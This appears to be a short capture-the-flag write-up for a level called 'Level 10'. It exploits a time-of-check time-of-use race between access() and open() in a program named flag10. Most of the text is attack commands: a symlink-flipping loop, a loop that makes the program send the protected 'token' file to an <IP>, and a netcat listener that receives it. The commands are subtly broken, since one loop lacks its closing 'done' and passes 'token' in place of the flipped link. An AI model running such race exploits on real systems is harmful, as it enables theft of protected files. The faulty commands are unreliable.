# Level 10

We can exploit this program through a race condition that occurs between checking permissions on the file with `access()` and actually reading the file with `open()`. This is classic TOCTOU (time-of-check time-of-use) race condition.

By using symlinks we can point `access()` to a file we can actually read and after switch the link to the file we actually want to get, in this case `token`.

Create while-loop for switching symlinks and run program:

```
while true; do ln -sf token flip; ln -sf public flip; done
while true; do ./flag10 token <IP>
```

Listen on machine for token with netcat:

`while true; do nc -lp 18211; done`
